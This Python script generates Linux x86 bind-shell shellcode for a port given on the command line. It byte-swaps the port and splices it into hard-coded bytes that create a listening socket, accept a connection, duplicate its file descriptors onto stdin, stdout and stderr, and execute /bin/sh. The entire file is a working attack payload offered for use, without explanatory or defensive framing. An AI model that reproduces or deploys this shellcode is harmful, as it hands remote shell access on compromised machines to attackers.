import sys
import struct
import binascii  # Import binascii for hexlify



if len(sys.argv) < 2:
    print("[#] Error: Please provide port number\n Usage: python shellCodeGenerator.py <port number>")
else:
    port = int(sys.argv[1])
    print("[#] Generating bind shellcode (listening port " + str(port) + ") ... ")

    # Correct the hex encoding
    port = "\\x" + binascii.hexlify(struct.pack('<H', port)).decode('utf-8')[2:4] + \
           "\\x" + binascii.hexlify(struct.pack('<H', port)).decode('utf-8')[:2]

    shellcode = (
        "\\x31\\xc0\\x50\\x40\\x50\\x89\\xc3\\x40\\x50\\x89\\xe1\\xb0\\x66\\xcd\\x80\\x89\\xc6"
        "\\x31\\xdb\\x53\\x66\\x68" + port +
        "\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb3\\x02\\xb0\\x66\\xcd\\x80"
        "\\x31\\xdb\\x53\\x56\\x89\\xe1\\xb3\\x04\\xb0\\x66\\xcd\\x80\\x31\\xdb\\x53\\x53\\x56"
        "\\x89\\xe1\\xb3\\x05\\xb0\\x66\\xcd\\x80\\x89\\xd9\\x83\\xe9\\x03\\x89\\xc3\\xb0\\x3f"
        "\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc9\\x89\\xca\\x51\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f"
        "\\x2f\\x62\\x69\\x89\\xe3\\xb0\\x0b\\xcd\\x80"
    )

    print(shellcode)
